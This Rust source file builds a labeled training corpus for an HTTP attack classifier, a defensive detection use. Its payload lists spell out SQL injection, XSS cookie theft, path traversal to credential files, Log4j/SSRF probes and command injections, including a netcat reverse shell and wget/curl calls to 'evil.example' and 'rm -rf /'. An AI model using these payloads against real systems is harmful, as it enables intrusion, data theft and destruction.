//! Bundled labeled training corpus for the payload classifier.
//!
//! This is a *real* labeled dataset: each entry is a synthetic-but-realistic
//! HTTP request, turned into the same 24-dimensional [`FeatureVector`] the
//! live engine extracts, paired with a binary label (1 = attack, 0 = benign).
//!
//! The corpus is generated deterministically (fixed templates + value lists)
//! so the trained model and the validation numbers are reproducible. It is
//! deliberately diverse across attack families (SQLi, XSS, path traversal,
//! command injection, SSRF) and benign traffic shapes (REST, search, forms,
//! JSON APIs) so the logistic-regression weights generalise beyond exact
//! keyword matches.

use std::net::{IpAddr, Ipv4Addr};

use percent_encoding::{utf8_percent_encode, NON_ALPHANUMERIC};
use sentinel_core::context::RequestContext;

use crate::features::FeatureVector;

/// One labeled training example.
pub struct LabeledSample {
    pub fv: FeatureVector,
    /// 1.0 = attack, 0.0 = benign.
    pub label: f32,
}

// ---------------------------------------------------------------------------
// Request builders
// ---------------------------------------------------------------------------

fn base_ctx() -> RequestContext {
    let mut ctx = RequestContext::new(IpAddr::V4(Ipv4Addr::LOCALHOST), 1234);
    ctx.request_headers
        .insert(http::header::HOST, "shop.example.com".parse().unwrap());
    ctx.request_headers.insert(
        http::header::USER_AGENT,
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/125.0 Safari/537.36"
            .parse()
            .unwrap(),
    );
    ctx
}

fn get(uri: &str) -> RequestContext {
    let mut ctx = base_ctx();
    ctx.method = http::Method::GET;
    ctx.uri = uri.parse().unwrap_or_default();
    ctx
}

/// GET request whose single query value carries a (raw) payload, safely
/// percent-encoded so `http::Uri` accepts it.  Mirrors a query-borne attack.
fn get_attack(path: &str, raw_value: &str) -> RequestContext {
    let enc = utf8_percent_encode(raw_value, NON_ALPHANUMERIC).to_string();
    get(&format!("{path}?q={enc}"))
}

fn post_form(path: &str, body: &str) -> RequestContext {
    let mut ctx = base_ctx();
    ctx.method = http::Method::POST;
    ctx.uri = path.parse().unwrap_or_default();
    ctx.request_headers.insert(
        http::header::CONTENT_TYPE,
        "application/x-www-form-urlencoded".parse().unwrap(),
    );
    ctx.request_body = Some(bytes::Bytes::from(body.to_string()));
    ctx
}

fn post_json(path: &str, body: &str) -> RequestContext {
    let mut ctx = base_ctx();
    ctx.method = http::Method::POST;
    ctx.uri = path.parse().unwrap_or_default();
    ctx.request_headers.insert(
        http::header::CONTENT_TYPE,
        "application/json".parse().unwrap(),
    );
    ctx.request_body = Some(bytes::Bytes::from(body.to_string()));
    ctx
}

// ---------------------------------------------------------------------------
// Payload / value lists
// ---------------------------------------------------------------------------

const SQLI: &[&str] = &[
    "1' OR '1'='1",
    "1' OR 1=1-- -",
    "admin'--",
    "1 UNION SELECT username,password FROM users",
    "1 UNION ALL SELECT NULL,NULL,NULL--",
    "1'; DROP TABLE users--",
    "1' AND SLEEP(5)-- -",
    "1' WAITFOR DELAY '0:0:5'--",
    "1 AND 1=CONVERT(int,(SELECT @@version))",
    "1' UNION SELECT load_file('/etc/passwd')--",
    "' OR '1'='1' /*",
    "1) UNION SELECT 1,2,3--",
    "1';EXEC xp_cmdshell('dir')--",
    "1' INTO OUTFILE '/tmp/x'--",
    "1 OR 1=1 LIMIT 1 OFFSET 1",
    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "1' OR BENCHMARK(1000000,MD5('a'))--",
    "1 PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x3a,version())),1)",
];

const XSS: &[&str] = &[
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(document.cookie)>",
    "javascript:alert(1)",
    "<iframe src=javascript:alert(1)>",
    "<body onload=alert(1)>",
    "<a href=\"javascript:void(0)\" onclick=alert(1)>x</a>",
    "<script>document.location='http://evil/'+document.cookie</script>",
    "<input onfocus=alert(1) autofocus>",
    "<details open ontoggle=alert(1)>",
    "\"><script>alert(String.fromCharCode(88,83,83))</script>",
    "<img src=1 href=1 onerror=\"javascript:alert(1)\">",
    "<svg><script>alert&#40;1&#41;</script>",
    "<marquee onstart=alert(1)>",
    "<video><source onerror=alert(1)>",
];

const TRAVERSAL: &[&str] = &[
    "../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "/var/www/../../etc/shadow",
    "php://filter/convert.base64-encode/resource=index.php",
    "..\\..\\..\\windows\\win.ini",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....\\\\....\\\\boot.ini",
    "/proc/self/environ",
    "file:///etc/passwd",
    "../../../../../../../../etc/hosts%00.png",
];

const CMDI: &[&str] = &[
    "127.0.0.1; cat /etc/passwd",
    "8.8.8.8 && whoami",
    "| ls -la /",
    "`id`",
    "$(curl http://evil.example/x)",
    "test; nc -e /bin/sh evil.example 4444",
    "; ping -c 10 127.0.0.1 #",
    "|| wget http://evil.example/shell.sh",
    "& type C:\\windows\\system32\\drivers\\etc\\hosts",
    "; rm -rf / --no-preserve-root",
];

const SSRF_LOG4J: &[&str] = &[
    "http://169.254.169.254/latest/meta-data/",
    "http://localhost:6379/",
    "${jndi:ldap://evil.example/a}",
    "${jndi:rmi://127.0.0.1:1099/x}",
    "http://[::1]:8080/admin",
    "gopher://127.0.0.1:11211/_stats",
    "dict://localhost:11211/stat",
];

// Benign value pieces -------------------------------------------------------

const BENIGN_QUERIES: &[&str] = &[
    "/products?page=1&sort=price",
    "/products?page=2&sort=name&order=asc",
    "/search?q=wireless+headphones",
    "/search?q=running+shoes&category=sport",
    "/api/v2/users/42",
    "/api/v2/users/42/orders",
    "/blog/2024/06/how-to-bake-bread",
    "/category/electronics?brand=acme&min=10&max=200",
    "/cart?item=12345&qty=2",
    "/account/settings",
    "/checkout?step=shipping",
    "/articles?tag=gardening&page=3",
    "/profile/john-doe",
    "/help/faq",
    "/images/banner-2024.png",
    "/api/products?limit=20&offset=40",
    "/reviews?product=998&rating=5",
    "/events?city=mumbai&date=2024-07-01",
    "/docs/getting-started",
    "/pricing",
    // Structurally busy but benign: many params, long values, ids, dates,
    // filters — these teach the model that breadth/length alone isn't an attack.
    "/api/v3/search?q=stainless+steel+water+bottle&brand=acme&color=blue&size=750ml&page=4&sort=rating&order=desc&in_stock=true",
    "/listings?lat=18.5204&lng=73.8567&radius=10&type=apartment&beds=2&baths=2&min_price=15000&max_price=40000",
    "/analytics/report?from=2024-01-01&to=2024-06-30&metric=revenue&granularity=month&segment=region&format=json",
    "/api/orders?status=shipped&customer=88213&from=2024-05-01&to=2024-05-31&include=items,tracking&page=2",
    "/catalog/books/9780131103627/reviews?sort=helpful&page=7&verified=true",
    "/flights?from=BOM&to=DEL&depart=2024-08-15&return=2024-08-22&adults=2&children=1&class=economy",
    "/dashboard/widgets?layout=grid&theme=dark&tz=Asia/Kolkata&refresh=30&panels=cpu,mem,net,disk",
    "/api/v2/products/12345/recommendations?limit=12&strategy=collaborative&exclude=owned",
    "/news/2024/06/23/markets-rally-on-strong-earnings-report",
    "/u/john.doe/photos/album/summer-2024",
    "/maps/directions?origin=Pune&destination=Mumbai&mode=driving&avoid=tolls&depart_at=2024-07-01T09:00",
    "/store/locator?postal=560001&country=IN&radius=25&services=pickup,returns",
];

const BENIGN_FORMS: &[&str] = &[
    "username=alice&password=correcthorsebatterystaple",
    "email=bob@example.com&subscribe=true",
    "first_name=John&last_name=Doe&age=34",
    "q=how+to+bake+sourdough+bread&lang=en",
    "comment=Great+article%2C+thanks+for+sharing",
    "title=Meeting+notes&body=Discussed+the+roadmap+and+next+steps",
    "city=Bangalore&pincode=560001&country=India",
    "rating=5&review=Excellent+product+would+buy+again",
    "search=summer+dresses&color=blue&size=M",
    "feedback=The+checkout+process+was+smooth+and+fast",
    "name=Acme+Corp&phone=18005551234&plan=pro",
    "from=2024-06-01&to=2024-06-30&format=csv",
    "message=Please+update+my+shipping+address",
    "product_name=Wireless+Mouse&qty=3&color=black",
    "subject=Invoice+request&priority=normal",
    // Benign text containing punctuation/encoded chars that naive detectors
    // over-flag (commas, parentheses, apostrophes, ampersands).
    "comment=I%20loved%20it%2C%20it%27s%20great%20%28really%29%20%26%20fast",
    "address=Flat%204%2C%20Building%20B%2C%20MG%20Road%2C%20Pune%20411001",
    "bio=Software+engineer+%26+coffee+enthusiast.+I+build+things.",
    "note=Call+me+at+5pm+%28after+the+meeting%29+%26+confirm",
    "description=Lightweight%2C+durable%2C+and+water-resistant+%2D+perfect+for+travel",
    "review=Pros%3A+battery%2C+screen.+Cons%3A+price.+Overall+4%2F5+stars",
    "tags=home%2Cgarden%2Coutdoor%2Csummer&visibility=public",
    "query=annual+report+2023+%28final%29&dept=finance&format=pdf",
];

const BENIGN_JSON: &[&str] = &[
    r#"{"username":"alice","remember":true}"#,
    r#"{"email":"carol@example.com","age":29}"#,
    r#"{"product_id":12345,"quantity":2,"color":"red"}"#,
    r#"{"query":"laptop","filters":{"brand":"acme","price_max":1500}}"#,
    r#"{"name":"John Doe","address":{"city":"Pune","zip":"411001"}}"#,
    r#"{"comment":"Looks great, shipping was fast","stars":5}"#,
    r#"{"event":"page_view","path":"/home","duration_ms":820}"#,
    r#"{"items":[{"sku":"A1","qty":1},{"sku":"B2","qty":3}]}"#,
    r#"{"title":"Notes","tags":["work","roadmap"],"pinned":false}"#,
    r#"{"lat":18.52,"lng":73.85,"radius_km":5}"#,
    r#"{"order":{"id":"ORD-2024-99812","items":[{"sku":"KB-104","qty":1,"price":2499}],"total":2499}}"#,
    r#"{"message":"Hi! Could you ship to a new address? It's 12, Park Lane (near the mall)."}"#,
    r#"{"filters":{"category":"electronics","price":{"min":100,"max":2000},"tags":["new","sale"]}}"#,
    r#"{"profile":{"name":"Priya Sharma","city":"Bengaluru","interests":["reading","hiking","music"]}}"#,
    r#"{"feedback":"Great support, resolved my issue in <5 minutes. Thanks & keep it up!"}"#,
];

// ---------------------------------------------------------------------------
// Corpus assembly
// ---------------------------------------------------------------------------

/// Build the full labeled corpus.  Deterministic order.
pub fn training_corpus() -> Vec<LabeledSample> {
    let mut out = Vec::new();
    let mut push = |ctx: RequestContext, label: f32| {
        out.push(LabeledSample {
            fv: FeatureVector::extract(&ctx),
            label,
        });
    };

    // --- Attacks (label 1.0) --- each payload appears as both a POST body and
    // a percent-encoded GET query, doubling coverage of both attack surfaces.
    let attack_paths = ["/item", "/search", "/api/lookup", "/view"];
    for (fam_i, fam) in [SQLI, XSS, TRAVERSAL, CMDI, SSRF_LOG4J].iter().enumerate() {
        for (i, payload) in fam.iter().enumerate() {
            let path = attack_paths[(fam_i + i) % attack_paths.len()];
            push(post_form(path, &format!("q={payload}")), 1.0);
            push(get_attack(path, payload), 1.0);
        }
    }

    // --- Benign (label 0.0) --- mirror the attack doubling (GET + POST) so the
    // classes stay balanced; an attack-skewed corpus inflates false positives.
    for uri in BENIGN_QUERIES {
        push(get(uri), 0.0);
        // Slight variation so vectors aren't identical duplicates.
        push(
            get(&format!(
                "{uri}{}ref=home",
                if uri.contains('?') { "&" } else { "?" }
            )),
            0.0,
        );
    }
    let benign_paths = ["/login", "/contact", "/api/save", "/comment", "/order"];
    for (i, body) in BENIGN_FORMS.iter().enumerate() {
        let path = benign_paths[i % benign_paths.len()];
        push(post_form(path, body), 0.0);
        // The same form submitted via GET — a urlencoded form body is itself a
        // valid query string, giving a benign-with-encoding GET example.
        push(get(&format!("/search?{body}")), 0.0);
    }
    for (i, body) in BENIGN_JSON.iter().enumerate() {
        push(post_json(benign_paths[i % benign_paths.len()], body), 0.0);
    }

    out
}

/// Convenience: corpus as `(feature_rows, labels)` for model training.
pub fn corpus_xy() -> (Vec<Vec<f32>>, Vec<f32>) {
    let samples = training_corpus();
    let x = samples.iter().map(|s| s.fv.values.to_vec()).collect();
    let y = samples.iter().map(|s| s.label).collect();
    (x, y)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn corpus_is_balanced_and_nonempty() {
        let samples = training_corpus();
        assert!(samples.len() > 100, "corpus too small: {}", samples.len());
        let attacks = samples.iter().filter(|s| s.label == 1.0).count();
        let benign = samples.iter().filter(|s| s.label == 0.0).count();
        assert!(
            attacks > 40 && benign > 40,
            "imbalanced: {attacks} atk / {benign} benign"
        );
        // Roughly balanced (within 2x) so the classifier isn't biased.
        let ratio = attacks as f32 / benign as f32;
        assert!(
            (0.5..=2.0).contains(&ratio),
            "class ratio {ratio} out of range"
        );
    }
}
